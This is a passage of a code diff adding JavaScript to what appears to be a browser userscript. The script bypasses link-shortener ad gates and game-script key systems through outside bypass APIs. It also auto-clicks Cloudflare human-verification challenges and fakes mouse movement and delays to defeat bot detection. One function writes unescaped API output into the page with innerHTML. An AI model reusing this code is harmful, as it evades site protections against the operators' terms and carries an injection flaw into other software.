+                    } else if (data.status === 'error' && data.message === 'Unsupported URL given') {
+                        // Fallback to the backup API if the primary fails
+                        fetch(`${backupApiUrl}${encodeURIComponent(userURL)}`)
+                            .then(response => response.json())
+                            .then(backupData => {
+                                if (backupData.success) {
+                                    resultDiv.innerText = decodeResult(backupData.result);
+                                } else if (backupData.success === false && backupData.error === 'Not supported.') {
+                                    resultDiv.innerText = 'Not supported.';
+                                } else {
+                                    resultDiv.innerText = 'Error: Backup API returned no result.';
+                                }
+                            })
+                            .catch(error => {
+                                resultDiv.innerText = `Error: ${error.message}`;
+                            });
+                    } else {
+                        resultDiv.innerText = 'Error: Primary API returned no result.';
+                    }
+                })
+                .catch(error => {
+                    resultDiv.innerText = `Error: ${error.message}`;
+                });
+        }
+    }
+
+    // Fetch special API function for specific cases
+    function fetchSpecialApi(apiUrl, userURL, keyName) {
+        fetch(`${apiUrl}${encodeURIComponent(userURL)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    resultDiv.innerText = decodeResult(data[keyName]);
+                } else {
+                    resultDiv.innerText = 'Error: Special API returned no result.';
+                }
+            })
+            .catch(error => {
+                resultDiv.innerText = `Error: ${error.message}`;
+            });
+    }
+
+    // Decode the result if it's an encoded URL
+    function decodeResult(result) {
+        try {
+            const decoded = decodeURIComponent(result);
+            return decoded.startsWith('http') ? decoded : result;
+        } catch (error) {
+            return result;  // Return the original if decoding fails
+        }
+    }
+
+    // Fetch API when button is clicked
+    fetchButton.addEventListener('click', () => {
+        const userURL = urlInput.value;
+        if (userURL.trim() === '') {
+            resultDiv.innerText = 'Please enter a valid URL.';
+            return;
+        }
+
+        // Start API fetching process
+        fetchApi(userURL);
+    });
+
+    // Clear the result div and URL input when the Clear button is clicked
+    clearButton.addEventListener('click', () => {
+        resultDiv.innerText = '';
+        urlInput.value = '';  // Also clear the URL input field
+    });
+
+    // Copy the result to clipboard when the Copy button is clicked
+    copyButton.addEventListener('click', () => {
+        const resultText = resultDiv.innerText;
+        if (resultText.trim() !== '') {
+            navigator.clipboard.writeText(resultText).then(() => {
+                notification('Copied to clipboard!');
+            }).catch(err => {
+                notification('Failed to copy text: ', err);
+            });
+        } else {
+            notification('No text to copy!');
+        }
+    });
+
+    // Add keybind to toggle the box visibility with F8 key
+    document.addEventListener('keydown', (event) => {
+        if (event.key === 'F8') {
+            if (container.style.display === 'none') {
+                container.style.display = 'block';  // Show the box
+            } else {
+                container.style.display = 'none';   // Hide the box
+            }
+        }
+    });
+})();
+
+// auto click Autopass Cloudflare CAPTCHA
+
+global_module = window['global_module'];
+
+async function VerifyYouAreHuman_01() {
+    let dom = await global_module.waitForElement("input[value='Verify you are human'][type='button']", null, null, 200, -1);
+    global_module.clickElement($(dom).eq(0)[0]);
+}
+
+async function VerifyYouAreHuman_02() {
+    let dom = await global_module.waitForElement("input[type='checkbox']", null, null, 200, -1);
+    global_module.clickElement($(dom).eq(0)[0]);
+    dom = await global_module.waitForElement("span[class='mark']", null, null, 200, -1);
+    global_module.clickElement($(dom).eq(0)[0]);
+}
+
+async function VerifyYouAreHuman_03() {
+    let dom = await global_module.waitForElement("input[value='Verify you are human'][type='button']", null, null, 200, -1);
+    global_module.clickElement($(dom).eq(0)[0]);
+}
+
+async function main() {
+    let ray_id = $("div[class='ray-id']");
+    let hrefdom = $("a[href*='cloudflare.com'][target='_blank']");
+    if (ray_id.length > 0 && hrefdom.length > 0) {
+        VerifyYouAreHuman_01();
+        return;
+    }
+    if (window.location.host == 'challenges.cloudflare.com' && $("div[id='success']").length > 0 && $("div[id='fail']").length > 0 && $("div[id='expired']").length > 0) {
+        VerifyYouAreHuman_02();
+        return;
+    }
+    if ($('div[class="logo"]').length > 0) {
+        VerifyYouAreHuman_03();
+        return;
+    }
+}
+
+$(document).ready(() => main());
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function sub2get() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function sub2unlock() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
+async function trigon_react() {
+    let currentUrl = window.location.href;
+
+    if (currentUrl.startsWith("https://trigonevo.com/getkey/?hwid=")) {
+        let hwid = currentUrl.split("hwid=")[1];
+        let newUrl = `https://pandadevelopment.net/getkey?service=trigon-evo&hwid=${hwid}&provider=linkvertise`;
+        window.location.href = newUrl;
+    }
+}
+
+async function trigon() {
+    if (window.location.href.includes("https://trigonevo.fun/whitelist/?HWID=")) {
+
+        let targetDivs = document.querySelectorAll("div.glass-light.bg-blue-600");
+
+        targetDivs.forEach(async function(div) {
+            let onclickAttr = div.getAttribute('onclick');
+            if (onclickAttr && onclickAttr.includes("https://link-to.net")) {
+                let regex = /window\.location\.href='(.*?)'/;
+                let match = regex.exec(onclickAttr);
+
+                if (match && match[1]) {
+                    let targetUrl = match[1];
+
+                    try {
+                        let response = await fetch(`https://api.bypass.vip/bypass?url=${targetUrl}`);
+                        let data = await response.json();
+
+                        if (data.status === "success" && data.result) {
+                            window.location.href = data.result;
+                        } else {
+                            console.error("API did not return a valid result");
+                        }
+                    } catch (error) {
+                        console.error("Error fetching API:", error);
+                        await notification_failed();
+                    }
+                }
+            }
+        });
+    }
+}
+
+async function relz() {
+    if (window.location.href.includes("https://getkey.relzscript.xyz/check1.php")) {
+        let continueButton = document.querySelector("a[href*='https://loot-link.com/s']");
+
+        if (continueButton) {
+            let targetUrl = continueButton.href;
+
+            try {
+                let response = await fetch(`https://api.bypass.vip/bypass?url=${encodeURIComponent(targetUrl)}`);
+                let data = await response.json();
+
+                if (data.status === "success" && data.result) {
+                    window.location.href = data.result;
+                } else {
+                    console.error("API did not return a valid result");
+                }
+            } catch (error) {
+                console.error("Error fetching API:", error);
+            }
+        } else {
+            console.error("Continue button not found on the page");
+        }
+    }
+
+    else if (window.location.href.includes("https://getkey.relzscript.xyz/check2.php")) {
+        let continueButton = document.querySelector("a[href='https://getkey.relzscript.xyz/check3.php']");
+
+        if (continueButton) {
+            window.location.href = continueButton.href;
+        } else {
+            console.error("Continue button not found on the page");
+        }
+    }
+
+    else if (window.location.href.includes("https://getkey.relzscript.xyz/check3.php")) {
+        let continueButton = document.querySelector("a[href='https://getkey.relzscript.xyz/finished.php']");
+
+        if (continueButton) {
+            window.location.href = continueButton.href;
+        } else {
+            console.error("Continue button not found on the page");
+        }
+    }
+}
+
+async function bothosting() {
+    function clickOnClaim() {
+        var boutonXPath = "/html/body/div[1]/div/section/section/article/div/main/div[1]/div/div[1]/div/div/button"; // Claim button XPath
+        var bouton = document.evaluate(boutonXPath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+
+        if (bouton) {
+            bouton.click();
+        }
+    }
+
+    // Attempt to click the claim button every second (1000 ms)
+    setInterval(clickOnClaim, 1000);
+
+    // Initial click attempt
+    clickOnClaim();
+}
+
+async function keyrblx() {
+    // Function to show debug messages, but only if the URL starts with 'https://keyrblx.com/getkey/'
+    function showDebugMessage(message) {
+        let currentUrl = window.location.href;
+        if (!currentUrl.startsWith('https://keyrblx.com/getkey/')) {
+            return; // Exit the function if the URL doesn't match
+        }
+
+        let debugDiv = document.getElementById('debug-messages');
+        if (!debugDiv) {
+            debugDiv = document.createElement('div');
+            debugDiv.id = 'debug-messages';
+            debugDiv.style.position = "fixed";
+            debugDiv.style.top = "10%";
+            debugDiv.style.right = "37.75%";
+            debugDiv.style.transform = "translateY(-50%)";
+            debugDiv.style.backgroundColor = "rgba(0,0,0,0.8)";
+            debugDiv.style.color = "white";
+            debugDiv.style.padding = "10px";
+            debugDiv.style.zIndex = "10000";
+            debugDiv.style.maxWidth = "400px";
+            debugDiv.style.overflowY = "auto";
+            document.body.appendChild(debugDiv);
+        }
+        let messageElem = document.createElement('div');
+        messageElem.textContent = message;
+        debugDiv.appendChild(messageElem);
+    }
+
+    function getOriginalLink() {
+        return window.location.href;
+    }
+
+    function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    function notification(message, timeout) {
+        const config = {
+            text: message,
+            title: "INFO",
+            silent: true,
+        };
+        if (timeout) config.timeout = timeout;
+        GM_notification(config);
+    }
+
+    async function clickButtonWithDelay(button, delayMin = 500, delayMax = 1000) {
+        let delayTime = Math.floor(Math.random() * (delayMax - delayMin + 1)) + delayMin;
+        await delay(delayTime);
+        button.click();
+        showDebugMessage(`Clicked button with delay: ${delayTime}ms`);
+    }
+
+    function simulateMouseMovement(element) {
+        const rect = element.getBoundingClientRect();
+        const x = rect.left + rect.width / 2;
+        const y = rect.top + rect.height / 2;
+        let event = new MouseEvent('mousemove', {
+            clientX: x,
+            clientY: y
+        });
+        document.dispatchEvent(event);
+        showDebugMessage(`Simulated mouse movement to (${x}, ${y})`);
+    }
+
+    function scrollPage() {
+        window.scrollBy(0, Math.random() * 100);
+        showDebugMessage('Scrolled the page');
+    }
+
+    function clickButtonByText(text) {
+        let button = Array.from(document.querySelectorAll('button'))
+            .find(btn => btn.textContent.trim() === text);
+
+        if (button) {
+            simulateMouseMovement(button);
+            scrollPage();
+            clickButtonWithDelay(button);
+            showDebugMessage('Clicked button with text: ' + text);
+            return true;
+        }
+        showDebugMessage('Button with text "' + text + '" not found');
+        return false;
+    }
+
+    // Helper function for sleep/delay
+    function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // Function to handle Turnstile CAPTCHA response
+    async function getTurnstileResponse() {
+        notification('Please solve the captcha');
+        const notificationInterval = setInterval(() => notification('Please solve the captcha', 5000), 6000);
+        let response = '';
+
+        while (true) {
+            try {
+                response = turnstile.getResponse();
+                if (response) break;
+            } catch (e) { }
+            await sleep(1000);
+        }
+
+        clearInterval(notificationInterval);
+        return turnstile.getResponse();
+    }
+
+    // Function to check if CAPTCHA is present
+    function isCaptchaPresent() {
+        return document.querySelector('.h-captcha') || document.querySelector('.g-recaptcha');
+    }
+
+    // Function to check if CAPTCHA is solved
+    function isCaptchaSolved() {
+        if (document.querySelector('.h-captcha') && document.querySelector('.h-captcha[style="display: none;"]')) {
+            return true;
+        }
+
+        if (document.querySelector('.g-recaptcha') && document.querySelector('.g-recaptcha-response').value) {
+            return true;
+        }
+
+        return false;
+    }
+
+    // Function to wait for CAPTCHA completion
+    async function waitForCaptchaCompletion() {
+        if (isCaptchaPresent()) {
+            showDebugMessage('Please solve the captcha');
+            while (!isCaptchaSolved()) {
+                await sleep(1000);
+            }
+            showDebugMessage('CAPTCHA solved');
+        }
+
+        if (document.getElementById('cf-turnstile')) {
+            await getTurnstileResponse();
+        }
+    }
+
+    async function startScript() {
+        let currentUrl = getOriginalLink();
+        showDebugMessage('Current URL: ' + currentUrl);
+
+        if (currentUrl.startsWith('https://keyrblx.com/getkey/')) {
+            await waitForCaptchaCompletion();
+
+            // After CAPTCHA is solved, click the "Continue" button
+            if (clickButtonByText('Continue')) return;
+        }
+    }
+
+    startScript();
+}
+
+async function linkvertise() {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    const currentUrl = window.location.href;
+    let errorShown = false;
+
+    const restrictedUrls = [
+        "https://ads.luarmor.net/",
+        "https://hohohubv-ac90f67762c4.herokuapp.com/"
+    ];
+
+    function notification(message, timeout) {
+        const config = {
+            text: message,
+            title: "INFO",
+            silent: true,
+            timeout: timeout || 5000
+        };
+        GM_notification(config);
+    }
+
+    function showNotification(message, showContinueButtons = false, key = null) {
+        const notificationContainer = document.createElement('div');
+        notificationContainer.id = 'notification-container';
+        notificationContainer.style.position = 'fixed';
+        notificationContainer.style.bottom = '20px';
+        notificationContainer.style.left = '20px';
+        notificationContainer.style.zIndex = '1000';
+        notificationContainer.style.display = 'flex';
+        notificationContainer.style.alignItems = 'center';
+        notificationContainer.style.justifyContent = 'center';
+        notificationContainer.style.flexDirection = 'column';
+        notificationContainer.style.backgroundColor = '#4CAF50';
+        notificationContainer.style.padding = '20px';
+        notificationContainer.style.borderRadius = '10px';
+        notificationContainer.style.color = 'white';
+
+        const notificationElement = document.createElement('div');
+        notificationElement.id = 'notification-box';
+        notificationElement.innerText = message;
+
+        notificationContainer.appendChild(notificationElement);
+
+        if (key) {
+            const keyElement = document.createElement('div');
+            keyElement.style.marginTop = '10px';
+            keyElement.style.fontSize = '16px';
+            keyElement.style.fontWeight = 'bold';
+            keyElement.innerText = `${key}`;
+            notificationContainer.appendChild(keyElement);
+
+            const copyButton = document.createElement('button');
+            copyButton.innerText = 'Copy';
+            copyButton.style.marginTop = '10px';
+            copyButton.style.padding = '10px';
+            copyButton.style.border = 'none';
+            copyButton.style.backgroundColor = '#008CBA';
+            copyButton.style.color = 'white';
+            copyButton.style.borderRadius = '5px';
+            copyButton.style.cursor = 'pointer';
+
+            copyButton.onclick = function () {
+                navigator.clipboard.writeText(key)
+                    .then(() => {
+                        notification('Text copied to clipboard');
+                        copyButton.innerText = 'Copied!';
+                        setTimeout(() => {
+                            copyButton.innerText = 'Copy';
+                        }, 2000);
+                    })
+                    .catch(err => {
+                        console.error('Error copying Text to clipboard', err);
+                    });
+            };
+
+            notificationContainer.appendChild(copyButton);
+        }
+
+        if (showContinueButtons) {
+            const buttonContainer = document.createElement('div');
+            buttonContainer.style.display = 'flex';
+            buttonContainer.style.gap = '10px';
+            buttonContainer.style.marginTop = '10px';
+
+            const yesButton = document.createElement('button');
+            yesButton.innerText = 'Yes';
+            yesButton.style.padding = '10px';
+            yesButton.style.border = 'none';
+            yesButton.style.backgroundColor = '#008CBA';
+            yesButton.style.color = 'white';
+            yesButton.style.borderRadius = '5px';
+            yesButton.style.cursor = 'pointer';
+            yesButton.onclick = async function () {
+                // Re-fetch API and handle result
+                try {
+                    const encodedUrl = encodeURIComponent(currentUrl);
+                    const response = await fetch("https://api.bypass.vip/bypass?url=" + encodedUrl);
+                    if (response.ok) {
+                        const data = await response.json();
+                        const resultUrl = data.result;
+                        window.location.href = resultUrl;
+                    } else {
+                        console.error('Failed to fetch URL');
+                    }
+                } catch (err) {
+                    console.error("Error during retry:", err);
+                } finally {
+                    removeNotification();
+                }
+            };
+
+            const noButton = document.createElement('button');
+            noButton.innerText = 'No';
+            noButton.style.padding = '10px';
+            noButton.style.border = 'none';
+            noButton.style.backgroundColor = '#f44336';
+            noButton.style.color = 'white';
+            noButton.style.borderRadius = '5px';
+            noButton.style.cursor = 'pointer';
+            noButton.onclick = removeNotification;
+
+            buttonContainer.appendChild(yesButton);
+            buttonContainer.appendChild(noButton);
+            notificationContainer.appendChild(buttonContainer);
+        }
+
+        document.body.appendChild(notificationContainer);
+    }
+
+    function removeNotification() {
+        const existingNotificationContainer = document.getElementById('notification-container');
+        if (existingNotificationContainer) {
+            existingNotificationContainer.remove();
+        }
+    }
+
+    try {
+        const delay = 2000;
+        await sleep(delay);
+
+        const encodedUrl = encodeURIComponent(currentUrl);
+        let response = await fetch("https://api.bypass.vip/bypass?url=" + encodedUrl);
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        const data = await response.json();
+        const resultUrl = data.result.split('\n')[0].trim();
+
+        if (restrictedUrls.some(restrictedUrl => resultUrl.startsWith(restrictedUrl))) {
+            console.log("Bypass detected. Might not be supported:", resultUrl);
+            showNotification("Bypass detected, URL has not been bypassed before. Do you want to continue the bypass?", true);
+            return;
+        }
+
+        const delayedUrls = [
+            "https://keyrblx.com/getkey/",
+            "https://pandadevelopment.net/getkey?",
+            "https://test.pandadevelopment.net/getkey?"
+        ];
+
+        if (delayedUrls.some(link => resultUrl.startsWith(link))) {
+            await sleep(10000);
+        }
+
+        if (resultUrl.startsWith("https://") || resultUrl.startsWith("http://")) {
+            window.location.href = resultUrl;
+        } else if (resultUrl) {
+            console.warn("API returned a Content instead of a URL.");
+            showNotification("API returned a Content:", false, resultUrl);
+        } else {
+            console.warn("API response doesn't contain a valid URL or key. Redirecting to bypass.city.");
+            throw new Error("API response doesn't contain a valid URL or key");
+        }
+    } catch (e) {
+        if (!errorShown) {
+            console.error("Error: API might be offline. Do you want to use Bypass.city?", e);
+            removeNotification();
+            showNotification("API might be offline. Do you want to use Bypass.city?", true);
+            errorShown = true;
+        }
+    }
+}
+
+async function paster() {
+    const currentUrl = window.location.href;
+  
+    // Create the notification box container
+    const notificationBox = document.createElement('div');
+    notificationBox.style.position = 'fixed';
+    notificationBox.style.top = '20px';
+    notificationBox.style.right = '20px';
+    notificationBox.style.padding = '20px';
+    notificationBox.style.backgroundColor = '#f9f9f9';
+    notificationBox.style.border = '1px solid #ccc';
+    notificationBox.style.borderRadius = '10px';
+    notificationBox.style.boxShadow = '0px 4px 15px rgba(0, 0, 0, 0.2)';
+    notificationBox.style.zIndex = '1000';
+    notificationBox.style.maxWidth = '350px'; // Adjust max width to fit screen better
+    notificationBox.style.fontFamily = 'Arial, sans-serif';
+    notificationBox.style.color = '#333';
+    notificationBox.style.wordWrap = 'break-word'; // Ensure long text wraps
+  
+    // Add a loading message
+    notificationBox.textContent = 'Loading...';
+  
+    // Add the notification box to the body
+    document.body.appendChild(notificationBox);
+  
+    try {
+      // Fetch the API response
+      const response = await fetch("https://api.bypass.vip/bypass?url=" + currentUrl);
+      const data = await response.json();
+  
+      // Extract the result and clean up unwanted characters
+      const result = data.result
+        .replace(/\\n/g, '') // Remove all \n
+        .replace(/\bn\b/g, ''); // Remove all standalone 'n' (e.g., ' n')
+  
+      // Create the content for the notification box
+      const resultText = document.createElement('div');
+      resultText.style.whiteSpace = 'pre-wrap'; // Preserve line breaks
+      resultText.innerHTML = result.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" style="color: blue;">$1</a>'); // Make URLs clickable and blue
+
+  
+      // Clear the loading message and add the result
+      notificationBox.textContent = '';
+      notificationBox.appendChild(resultText);
+  
+      // Create the "Copy All" button
+      const copyButton = document.createElement('button');
+      copyButton.textContent = 'Copy All';
+      copyButton.style.marginTop = '10px';
+      copyButton.style.marginRight = '10px';
+      copyButton.style.padding = '5px 10px';
+      copyButton.style.backgroundColor = '#28a745';
+      copyButton.style.color = 'white';
+      copyButton.style.border = 'none';
+      copyButton.style.borderRadius = '5px';
+      copyButton.style.cursor = 'pointer';
+  
+      copyButton.addEventListener('click', () => {
+        navigator.clipboard.writeText(result).then(() => {
+          alert('Text copied to clipboard!');
+        }).catch(err => {
+          console.error('Failed to copy: ', err);
+        });
+      });
+      notificationBox.appendChild(copyButton);
+  
+      // Add a close button to the notification box
+      const closeButton = document.createElement('button');
+      closeButton.textContent = 'Close';
+      closeButton.style.marginTop = '10px';
+      closeButton.style.padding = '5px 10px';
+      closeButton.style.backgroundColor = '#dc3545';
+      closeButton.style.color = 'white';
+      closeButton.style.border = 'none';
+      closeButton.style.borderRadius = '5px';
+      closeButton.style.cursor = 'pointer';
+  
+      closeButton.addEventListener('click', () => {
+        document.body.removeChild(notificationBox);
+      });
+      notificationBox.appendChild(closeButton);
+  
+    } catch (error) {
+      // Handle any errors
+      notificationBox.textContent = 'Error fetching data';
+      console.error(error);
+    }
+}
+
+async function workink() {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    const currentUrl = window.location.href;
+
+    function showNotification(message, key = null) {
+        const notificationContainer = document.createElement('div');
+        notificationContainer.id = 'notification-container';
+        notificationContainer.style.position = 'fixed';
+        notificationContainer.style.bottom = '20px';
+        notificationContainer.style.left = '20px';
+        notificationContainer.style.zIndex = '1000';
+        notificationContainer.style.display = 'flex';
+        notificationContainer.style.alignItems = 'center';
+        notificationContainer.style.justifyContent = 'center';
+        notificationContainer.style.flexDirection = 'column';
+        notificationContainer.style.backgroundColor = '#4CAF50';
+        notificationContainer.style.padding = '20px';
+        notificationContainer.style.borderRadius = '10px';
+        notificationContainer.style.color = 'white';
+
+        const notificationElement = document.createElement('div');
+        notificationElement.id = 'notification-box';
+        notificationElement.innerText = message;
+
+        notificationContainer.appendChild(notificationElement);
+
+        if (key) {
+            const keyElement = document.createElement('div');
+            keyElement.style.marginTop = '10px';
+            keyElement.style.fontSize = '16px';
+            keyElement.style.fontWeight = 'bold';
+            keyElement.innerText = `${key}`;
+            notificationContainer.appendChild(keyElement);
+
+            const copyButton = document.createElement('button');
+            copyButton.innerText = 'Copy';
+            copyButton.style.marginTop = '10px';
+            copyButton.style.padding = '10px';
+            copyButton.style.border = 'none';
+            copyButton.style.backgroundColor = '#008CBA';
+            copyButton.style.color = 'white';
+            copyButton.style.borderRadius = '5px';
+            copyButton.style.cursor = 'pointer';
+
+            copyButton.onclick = function () {
+                navigator.clipboard.writeText(key)
+                    .then(() => {
+                        alert('Key copied to clipboard');
+                        copyButton.innerText = 'Copied!';
+                        setTimeout(() => {
+                            copyButton.innerText = 'Copy';
+                        }, 2000);
+                    })
+                    .catch(err => {
+                        console.error('Error copying key to clipboard', err);
+                    });
+            };
+
+            notificationContainer.appendChild(copyButton);
+        }
+
+        document.body.appendChild(notificationContainer);
+    }
+
+    function removeNotification() {
+        const existingNotificationContainer = document.getElementById('notification-container');
+        if (existingNotificationContainer) {
+            existingNotificationContainer.remove();
+        }
+    }
+
+    try {
+        console.log("Starting script, current URL:", currentUrl);
+        await sleep(2000);
+
+        console.log("Sending request to API...");
+        let response = await fetch("https://api.bypass.vip/bypass?url=" + currentUrl);
+        if (!response.ok) {
+            console.error(`HTTP error! status: ${response.status}`);
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        console.log("API responded, parsing JSON...");
+        const data = await response.json();
+        console.log("Parsed JSON:", data);
+
+        // Check for CloudFlare error response
+        if (data.result === "bypas fail! Ooops, we're getting issues bypassing CloudFlare, Please retry, this is a Server-side Error | Detailed error: Error Solving Turnstile Captcha | Bypass Ended at 93/100") {
+            showNotification("Bypass CloudFlare Failed!");
+            return;
+        }
+
+        if (data.result && data.result.startsWith("https://")) {
+            console.log("Valid URL found, redirecting to:", data.result);
+            window.location.href = data.result;
+        } else if (data.result) {
+            let decodedUrl = decodeURIComponent(data.result);
+            if (decodedUrl.startsWith("https://")) {
+                console.log("Encoded URL found, redirecting to decoded URL:", decodedUrl);
+                window.location.href = decodedUrl;
+            } else {
+                console.warn("API returned a key instead of a URL.");
+                showNotification("API returned a key:", data.result);
+            }
+        } else {
+            console.warn("First API response doesn't contain a valid URL or key.");
+            throw new Error("First API response doesn't contain a valid URL or key");
+        }
+    } catch (e) {
+        console.error("Error: API might be offline or returned an invalid response.", e);
+        await notification_failed();
+    }
+}
+
+async function bstlar() {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    const currentUrl = window.location.href;
+
+    function showNotification(message, key = null) {
+        const notificationContainer = document.createElement('div');
+        notificationContainer.id = 'notification-container';
+        notificationContainer.style.position = 'fixed';
+        notificationContainer.style.bottom = '20px';
+        notificationContainer.style.left = '20px';
+        notificationContainer.style.zIndex = '1000';
+        notificationContainer.style.display = 'flex';
+        notificationContainer.style.alignItems = 'center';
+        notificationContainer.style.justifyContent = 'center';
+        notificationContainer.style.flexDirection = 'column';
+        notificationContainer.style.backgroundColor = '#4CAF50';
+        notificationContainer.style.padding = '20px';
+        notificationContainer.style.borderRadius = '10px';
+        notificationContainer.style.color = 'white';
+
+        const notificationElement = document.createElement('div');
+        notificationElement.id = 'notification-box';
+        notificationElement.innerText = message;
+
+        notificationContainer.appendChild(notificationElement);
+
+        if (key) {
+            const keyElement = document.createElement('div');
+            keyElement.style.marginTop = '10px';
+            keyElement.style.fontSize = '16px';
+            keyElement.style.fontWeight = 'bold';
+            keyElement.innerText = `${key}`;
+            notificationContainer.appendChild(keyElement);
+
+            const copyButton = document.createElement('button');
+            copyButton.innerText = 'Copy';
+            copyButton.style.marginTop = '10px';
+            copyButton.style.padding = '10px';
+            copyButton.style.border = 'none';
+            copyButton.style.backgroundColor = '#008CBA';
+            copyButton.style.color = 'white';
+            copyButton.style.borderRadius = '5px';
+            copyButton.style.cursor = 'pointer';
+
+            copyButton.onclick = function () {
+                navigator.clipboard.writeText(key)
+                    .then(() => {
+                        alert('Key copied to clipboard');
+                        copyButton.innerText = 'Copied!';
+                        setTimeout(() => {
+                            copyButton.innerText = 'Copy';
+                        }, 2000);
+                    })
+                    .catch(err => {
+                        console.error('Error copying key to clipboard', err);
+                    });
+            };
+
+            notificationContainer.appendChild(copyButton);
+        }
+
+        document.body.appendChild(notificationContainer);
+    }
+
+    function removeNotification() {
+        const existingNotificationContainer = document.getElementById('notification-container');
+        if (existingNotificationContainer) {
+            existingNotificationContainer.remove();
+        }
+    }
+
+    try {
+        console.log("Starting script, current URL:", currentUrl);
+        await sleep(2000);
+
+        console.log("Sending request to API...");
+        let response = await fetch("https://api.bypass.vip/bypass?url=" + currentUrl);
+        if (!response.ok) {
+            console.error(`HTTP error! status: ${response.status}`);
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        console.log("API responded, parsing JSON...");
+        const data = await response.json();
+        console.log("Parsed JSON:", data);
+
+        if (data.result && data.result.startsWith("https://")) {
+            console.log("Valid URL found, redirecting to:", data.result);
+            window.location.href = data.result;
+        } else if (data.result) {
+            let decodedUrl = decodeURIComponent(data.result);
+            if (decodedUrl.startsWith("https://")) {
+                console.log("Encoded URL found, redirecting to decoded URL:", decodedUrl);
+                window.location.href = decodedUrl;
+            } else {
+                console.warn("API returned a key instead of a URL.");
+                showNotification("API returned a key:", data.result);
+            }
+        } else {
+            console.warn("First API response doesn't contain a valid URL or key.");
+            throw new Error("First API response doesn't contain a valid URL or key");
+        }
+    } catch (e) {
+        console.error("Error: API might be offline or returned an invalid response.", e);
+        await notification_failed();
+    }
+}
+
+async function lootlabs() {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+    const currentUrl = window.location.href;
+
+    // Check if the URL starts with 'https://loot-link.com/s?fJjn&r='
+    if (currentUrl.startsWith("https://loot-link.com/s?fJjn&r=") || currentUrl.startsWith("https://loot-link.com/s?812c32a9&r=")) {
+        console.log("Detected loot-link URL, using backup function to bypass.");
+        await lootlabsBackup();
+        return;
+    }
+
+    try {
+        console.log("Starting script, current URL:", currentUrl);
+        await sleep(2000); // Sleep for 2000 milliseconds (2 seconds)
+
+        // Primary API
+        console.log("Sending request to primary API...");
+        let response = await fetch("https://api.bypass.vip/bypass?url=" + currentUrl);
+        if (!response.ok) {
+            console.error(`HTTP error! status: ${response.status}`);
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        console.log("Primary API responded, parsing JSON...");
+        let data = await response.json();
+        console.log("Parsed JSON:", data);
+
+        if (data.status === "success" && data.result && data.result.startsWith("https://")) {
+            if (data.result.startsWith("https://keyrblx.com/getkey/")) {
+                console.log("Detected keyrblx URL, waiting 10 seconds before redirecting...");
+                await sleep(10000); // Delay for 10 seconds
+            }
+
+            if (!data.result.includes("lootdest.com")) {
+                console.log("Valid URL found from primary API, redirecting to:", data.result);
+                window.location.href = data.result;
+                return;
+            }
+        } else {
+            console.warn("Primary API response doesn't contain a valid URL or status, or URL is detected.");
+            throw new Error("Primary API response doesn't contain a valid URL or status, or URL is detected");
+        }
+    } catch (e) {
+        console.error("Error: Primary API might be offline or returned an invalid response.", e);
+        console.log("Trying fallback API...");
+
+        try {
+            // Fallback API
+            let fallbackResponse = await fetch("https://dlr.kys.gay/api/free/bypass?url=" + currentUrl);
+            if (!fallbackResponse.ok) {
+                console.error(`HTTP error! status: ${fallbackResponse.status}`);
+                throw new Error(`HTTP error! status: ${fallbackResponse.status}`);
+            }
+
+            console.log("Fallback API responded, parsing JSON...");
+            let fallbackData = await fallbackResponse.json();
+            console.log("Parsed JSON from fallback API:", fallbackData);
+
+            if (fallbackData.result && fallbackData.result.startsWith("https://")) {
+                if (fallbackData.result.startsWith("https://keyrblx.com/getkey/")) {
+                    console.log("Detected keyrblx URL from fallback, waiting 10 seconds before redirecting...");
+                    await sleep(10000); // Delay for 10 seconds
+                }
+
+                if (!fallbackData.result.includes("lootdest.com")) {
+                    console.log("Valid URL found from fallback API, redirecting to:", fallbackData.result);
+                    window.location.href = fallbackData.result;
+                } else {
+                    console.warn("Fallback API response doesn't contain a valid URL or URL is detected.");
+                    throw new Error("Fallback API response doesn't contain a valid URL or URL is detected");
+                }
+            }
+        } catch (fallbackError) {
+            console.error("Error: Fallback API might be offline or returned an invalid response.", fallbackError);
+            await notification_failed();
+        }
+    }
+}
+
+async function lootlabsBackup() {
+    const urlnow = window.location.href;
+    function isBase64(str) {
+        try {
+            if (typeof str !== 'string' || str.length === 0) return false;
+            const base64Pattern = /^[A-Za-z0-9+/=]+$/;
+            if (!base64Pattern.test(str)) return false;
+            const decodedStr = atob(str);
+            return btoa(decodedStr) === str;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    function getParameterByName(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+    }
+
+    const lutink = false;
+    const base64String = getParameterByName('r');
+    if (base64String && isBase64(base64String)) {
+        try {
+            const decodedUrl = atob(base64String);
+            window.location.href = decodedUrl;
+
+        } catch (error) {
+            console.error('Error\n', error)
+            await notification_failed();
+        }
+    }
+}
+
+async function mboost() {
+    try {
+        await sleep(2000); // Sleep for 10000 milliseconds (10 seconds)
+        const response = await fetch("https://api.bypass.vip/bypass?url=" + window.location.href);
+        const data = await response.json();
+        window.location.href = data.result;
+    } catch (e) {
+        await notification_failed();
+    }
+}
+
